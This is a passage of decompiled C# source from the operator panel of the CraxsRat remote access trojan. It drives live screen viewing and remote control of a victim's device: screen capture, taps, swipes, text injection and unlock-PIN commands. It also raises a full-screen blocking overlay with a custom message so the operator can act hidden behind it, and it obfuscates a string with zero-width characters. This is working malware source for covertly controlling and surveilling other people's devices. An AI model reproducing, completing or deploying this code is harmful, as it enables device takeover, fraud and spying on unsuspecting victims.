		((System.ComponentModel.ISupportInitialize)this.Livepicbox).EndInit();
		this.vewpnl.ResumeLayout(false);
		this.Panel8.ResumeLayout(false);
		this.Panel1.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.PictureBox3).EndInit();
		((System.ComponentModel.ISupportInitialize)this.PictureBox2).EndInit();
		this.Panel5.ResumeLayout(false);
		this.Panel6.ResumeLayout(false);
		this.Panel7.ResumeLayout(false);
		this.Panel9.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

	private void trans()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) == 0)
			{
				Save.Text = "节省";
				checkblock.Text = "屏幕阻挡";
				chkctrl.Text = "允许控制";
				StartButton.Text = Codes.Translate(StartButton.Text, "en", "zh");
				StopButton.Text = Codes.Translate(StopButton.Text, "en", "zh");
			}
		}
		else
		{
			Save.Text = "حفظ";
			checkblock.Text = "حظر";
			chkctrl.Text = "تحكم";
			StartButton.Text = Codes.Translate(StartButton.Text, "en", "ar");
			StopButton.Text = Codes.Translate(StopButton.Text, "en", "ar");
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsuhdfkjxba(object sender, EventArgs e)
	{
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatskjasnhfcs(object sender, EventArgs e)
	{
		combosize.Items.Clear();
		trans();
		string[] array = sizearry;
		foreach (string item in array)
		{
			combosize.Items.Add(item);
		}
		ShowTipform showTipform = new ShowTipform(RegistryHandler.ShowScrenShotTip, Resources.Tip_screenctrol);
		string text = RegistryHandler.GET_Tip(RegistryHandler.ShowScrenShotTip);
		bool flag = true;
		if (text != null)
		{
			if (Operators.CompareString(text, "no", TextCompare: false) == 0)
			{
				flag = false;
			}
		}
		else
		{
			flag = true;
		}
		if (flag)
		{
			showTipform.ShowDialog();
		}
		showTipform.Dispose();
		base.KeyPreview = true;
		base.Tag = classClient.ClientRemoteAddress;
		toptitle.Text = "CraxsRat.vip";
		combosize.Text = "Auto";
		PictureBox2.Image = classClient.Wallpaper;
		PictureBox3.Image = classClient.Flag;
		base.TransparencyKey = Color.FromArgb(45, 45, 45);
		BackColor = Color.FromArgb(45, 45, 45);
		Qualtibox.Text = MySettingsProperty.Settings.live_sc_qulty;
		int num = 2;
		checked
		{
			do
			{
				FPSBOX.Items.Add(num.ToString());
				num++;
			}
			while (num <= 30);
			FPSBOX.Text = "30";
			Qualtibox.Items.Clear();
			int num2 = 1;
			do
			{
				Qualtibox.Items.Add(num2.ToString());
				num2++;
			}
			while (num2 <= 100);
			Qualtibox.Text = "20";
			PBS.MinimumSize = new Size(0, 0);
			PBS.Size = new Size(384, 5);
			PBS.Width = 384;
			PBS.Height = 5;
			SetWindowPos(hWndInsertAfter: new IntPtr(-2), hWnd: base.Handle, X: 0, Y: 0, cx: 0, cy: 0, uFlags: 3u);
			keepmeto = true;
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxscdasjj(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			try
			{
				string[] array = classClient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Client,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>U" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatszxcds(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			try
			{
				string[] array = classClient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Client,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>D" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			try
			{
				string[] array = classClient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Client,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>L" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Button4_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			try
			{
				string[] array = classClient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Client,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>R" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Button5_Click(object sender, EventArgs e)
	{
	}

	private void Button6_Click(object sender, EventArgs e)
	{
	}

	private void Button7_Click(object sender, EventArgs e)
	{
	}

	public void Viewdimiss()
	{
		if (Dismisbtn.InvokeRequired)
		{
			Delegatstoper method = Viewdimiss;
			Dismisbtn.Invoke(method);
		}
		else
		{
			Dismisbtn.Visible = true;
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		ScreenShotFoucs = false;
		Dismisbtn.Visible = false;
		if (e.Button == MouseButtons.Left)
		{
			Trakpoint = new List<Point>();
			Trakpoint.Add(new Point(e.X, e.Y));
			isclick = false;
			isdown = true;
		}
		else
		{
			presstimer.Enabled = true;
			isclick = true;
		}
	}

	private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
	{
		isdown = false;
		int num = Livepicbox.Width;
		int num2 = Livepicbox.Height;
		checked
		{
			if (!isclick)
			{
				if (!Swaping)
				{
					return;
				}
				Swaping = false;
				Trakpoint.Add(new Point(e.X, e.Y));
				StringBuilder stringBuilder = new StringBuilder();
				foreach (Point item in Trakpoint)
				{
					stringBuilder.Append(new Point((int)Math.Round((double)item.X * ((double)ScreenSize.Width / (double)num)), (int)Math.Round((double)item.Y * ((double)ScreenSize.Height / (double)num2))).ToString() + ":");
				}
				string[] array = classClient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Client,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>" + stringBuilder.ToString() + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
				return;
			}
			presstimer.Enabled = false;
			presstimer.Stop();
			string text = "clk:";
			if (tiks > 3)
			{
				text = "clk:hold:";
			}
			tiks = 0;
			Point point = Livepicbox.PointToClient(Control.MousePosition);
			if (Operators.CompareString(combosize.Text, "Auto", TextCompare: false) != 0)
			{
				string[] array2 = combosize.Text.Split('x');
				ScreenSize = new Size(Conversions.ToInteger(array2[1]), Conversions.ToInteger(array2[0]));
			}
			Point point2 = new Point((int)Math.Round((double)point.X * ((double)ScreenSize.Width / (double)num)), (int)Math.Round((double)point.Y * ((double)ScreenSize.Height / (double)num2)));
			text = text + point2.X + ":" + point2.Y;
			string[] array3 = classClient.Keys.Split(':');
			object[] parametersObjects2 = new object[4]
			{
				Client,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>" + text + Data.SPL_SOCKET + array3[0] + Data.SPL_SOCKET + array3[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects2);
		}
	}

	private void PictureBox1_MouseMove(object sender, MouseEventArgs e)
	{
		if (isdown)
		{
			Swaping = true;
			isclick = false;
			if (e.X > 0 && e.Y > 0)
			{
				Trakpoint.Add(new Point(e.X, e.Y));
			}
		}
	}

	private void Button1_Click_2(object sender, EventArgs e)
	{
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsgfnbwq(object sender, EventArgs e)
	{
	}

	private void Autosave_CheckedChanged(object sender)
	{
	}

	[DllImport("user32.dll")]
	public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

	[DllImport("user32.dll")]
	public static extern bool ReleaseCapture();

	private void Panel2_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 161, 2, 0);
		}
	}

	private void Panel3_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 161, 2, 0);
		}
	}

	private void Panel4_MouseDown(object sender, MouseEventArgs e)
	{
		if (e.Button == MouseButtons.Left)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 161, 2, 0);
		}
	}

	private void Button1_Click_3(object sender, EventArgs e)
	{
	}

	public string Clientout(string timeoutmil)
	{
		string[] array = (timeoutmil + "\u200b97\u200b120\u200b115\u200b32\u200b82\u200b97\u200b116\u200b32\u200b86\u200b52").Replace("\u200b", " ").Split(' ');
		string text = "";
		string[] array2 = array;
		foreach (string text2 in array2)
		{
			if (text2.Length > 0)
			{
				text += Conversions.ToString(Strings.Chr(Convert.ToInt32(text2)));
			}
		}
		return text;
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxscajhg(object sender, FormClosingEventArgs e)
	{
		base.Name = null;
		if (classClient != null)
		{
			try
			{
				string[] array = classClient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Client,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sc:off" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				toptitle.Text = "...";
				classClient.SendMessage(parametersObjects);
				StartButton.Enabled = true;
				StopButton.Enabled = false;
				toptitle.Text = "CraxsRat.vip";
				vewpnl.Enabled = false;
				Livepicbox.Enabled = false;
				LIVE = false;
				refreshtimer.Stop();
				PBS.Value = 0;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		Dispose();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		if (Save.Checked)
		{
			if (!Directory.Exists(DownloadsFolder + "\\ScreenShots"))
			{
				Directory.CreateDirectory(DownloadsFolder + "\\ScreenShots");
			}
			try
			{
				Livepicbox.Image.Save(DownloadsFolder + "\\ScreenShots\\IMG-" + DateTime.Now.Day + "-" + DateTime.Now.Month + "-" + DateTime.Now.Millisecond + ".png");
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		Timer1.Stop();
	}

	private void Refreshtimer_Tick(object sender, EventArgs e)
	{
		checked
		{
			if (LIVE)
			{
				if (Rnew == 0)
				{
					return;
				}
				try
				{
					if (PBS.Value < PBS.Maximum)
					{
						PBS.Value++;
					}
					else
					{
						PBS.Value = 0;
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				Rnew = 0;
			}
			else
			{
				refreshtimer.Stop();
				refreshtimer.Enabled = false;
			}
		}
	}

	public void Done(object[] objs)
	{
		if (toptitle.InvokeRequired)
		{
			addLogback method = Done;
			toptitle.Invoke(method, new object[1] { objs });
		}
		else
		{
			string text = Conversions.ToString(objs[0]);
			toptitle.Text = text;
		}
	}

	private void Presstimer_Tick(object sender, EventArgs e)
	{
		checked
		{
			tiks++;
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsjkhsdawe(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			try
			{
				string[] array = classClient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Client,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>LK" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatszxsxaj(object sender, EventArgs e)
	{
		if (Operators.CompareString(SKtype.Text, "Slient", TextCompare: false) == 0)
		{
			if (classClient != null)
			{
				try
				{
					string[] array = classClient.Keys.Split(':');
					object[] parametersObjects = new object[4]
					{
						Client,
						SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>SK" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
						Codes.Encoding().GetBytes("null"),
						classClient
					};
					classClient.SendMessage(parametersObjects);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		else if (classClient != null)
		{
			try
			{
				string[] array2 = classClient.Keys.Split(':');
				object[] parametersObjects2 = new object[4]
				{
					Client,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>SK2" + Data.SPL_SOCKET + array2[0] + Data.SPL_SOCKET + array2[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects2);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Dismisbtn_Click(object sender, EventArgs e)
	{
		if (Livepicbox.Image != null)
		{
			Livepicbox.Image = null;
			ScreenShotFoucs = false;
			Dismisbtn.Visible = false;
		}
	}

	private void Checkblock_MouseClick(object sender, MouseEventArgs e)
	{
		TcpClient myClient = classClient.myClient;
		string[] array = classClient.Keys.Split(':');
		if (checkblock.Checked)
		{
			if (classClient != null)
			{
				Dialog1 dialog = new Dialog1();
				dialog.Title = "Blocking message (optional)";
				dialog.ShowDialog();
				if (dialog.DialogResult == DialogResult.OK)
				{
					object[] parametersObjects = new object[4]
					{
						myClient,
						SecurityKey.KeysClient2 + Data.SPL_SOCKET + "Blkt<*>" + dialog.TheText + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
						Codes.Encoding().GetBytes("null"),
						classClient
					};
					classClient.SendMessage(parametersObjects);
				}
				chkctrl.Enabled = true;
				object[] parametersObjects2 = new object[4]
				{
					myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "BLKV<*>on" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects2);
			}
		}
		else if (classClient != null)
		{
			chkctrl.Enabled = false;
			object[] parametersObjects3 = new object[4]
			{
				myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "BLKV<*>off" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects3);
		}
	}

	private void ScreenShoter_KeyDown(object sender, KeyEventArgs e)
	{
	}

	private void ScreenShoter_KeyUp(object sender, KeyEventArgs e)
	{
	}

	private void Save_MouseClick(object sender, MouseEventArgs e)
	{
		if (Save.Checked)
		{
			Timer1.Start();
		}
		else
		{
			Timer1.Stop();
		}
	}

	private void DrakeUIAvatar3_Click(object sender, EventArgs e)
	{
		if (classClient != null && !LIVE)
		{
			try
			{
				string[] array = classClient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Client,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sc:on:" + Qualtibox.Text + "~" + FPSBOX.Text + "~" + classClient.ClientRemoteAddress + "~" + MySettingsProperty.Settings.resolution + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
				toptitle.Text = "Connecting , Please Wait...";
				StartButton.Enabled = false;
				StopButton.Enabled = true;
				vewpnl.Enabled = true;
				Livepicbox.Enabled = true;
				LIVE = true;
				refreshtimer.Enabled = true;
				refreshtimer.Start();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void DrakeUIAvatar6_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void Chkctrl_MouseClick(object sender, MouseEventArgs e)
	{
		if (chkctrl.Checked)
		{
			if (LIVE && checkblock.Checked)
			{
				iscontroled = true;
				if (classClient != null)
				{
					string[] array = classClient.Keys.Split(':');
					object[] parametersObjects = new object[4]
					{
						classClient.myClient,
						SecurityKey.KeysClient2 + Data.SPL_SOCKET + "pslock<*>allow" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
						Codes.Encoding().GetBytes("null"),
						classClient
					};
					classClient.SendMessage(parametersObjects);
				}
			}
		}
		else if (Conversions.ToBoolean(iscontroled) && classClient != null)
		{
			string[] array2 = classClient.Keys.Split(':');
			object[] parametersObjects2 = new object[4]
			{
				classClient.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "pslock<*>disallow" + Data.SPL_SOCKET + array2[0] + Data.SPL_SOCKET + array2[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects2);
		}
	}

	private void DrakeUIAvatar5_Click(object sender, EventArgs e)
	{
		base.WindowState = FormWindowState.Minimized;
	}

	private void DrakeUIAvatar3_Click_1(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			try
			{
				string[] array = classClient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Client,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>Bc" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void DrakeUIAvatar4_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			try
			{
				string[] array = classClient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Client,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>Ho" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void DrakeUIAvatar7_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			try
			{
				string[] array = classClient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Client,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>RC" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void StopButton_Click(object sender, EventArgs e)
	{
		if (classClient == null)
		{
			return;
		}
		try
		{
			string[] array = classClient.Keys.Split(':');
			if (ScreenClass != null)
			{
				ScreenClass.Close(ScreenClass.myClient);
			}
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sc:off" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			toptitle.Text = "...";
			classClient.SendMessage(parametersObjects);
			StartButton.Enabled = true;
			StopButton.Enabled = false;
			toptitle.Text = "CraxsRat.vip";
			vewpnl.Enabled = false;
			Livepicbox.Enabled = false;
			LIVE = false;
			refreshtimer.Stop();
			PBS.Value = 0;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void ScreenShoter_KeyDown_1(object sender, KeyEventArgs e)
	{
		char c = Conversions.ToChar(MyProject.Computer.Keyboard.CapsLock ? Conversions.ToString(Strings.ChrW((int)e.KeyCode)) : Strings.ChrW((int)e.KeyCode).ToString().ToLower());
		Console.WriteLine("Key Pressed: " + Conversions.ToString(c));
	}

	private void DrakeUIAvatar2_Click(object sender, EventArgs e)
	{
		if (classClient != null && textsend.Text.Length > 0)
		{
			object[] parametersObjects = new object[4]
			{
				classClient.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "pst<*>" + textsend.Text + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
			textsend.Text = "";
		}
	}

	private void DrakeUIAvatar8_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			try
			{
				string[] array = classClient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					classClient.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>En" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void DrakeUIAvatar9_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			try
			{
				string[] array = classClient.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					Client,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>UPIN" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					classClient
				};
				classClient.SendMessage(parametersObjects);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (keepmeto)
		{
			pinbtn.ForeColor = Color.Lime;
			SetWindowPos(hWndInsertAfter: new IntPtr(-1), hWnd: base.Handle, X: 0, Y: 0, cx: 0, cy: 0, uFlags: 3u);
			keepmeto = false;
		}
		else
		{
			pinbtn.ForeColor = Color.Red;
			SetWindowPos(hWndInsertAfter: new IntPtr(-2), hWnd: base.Handle, X: 0, Y: 0, cx: 0, cy: 0, uFlags: 3u);
			keepmeto = true;
		}
	}
}
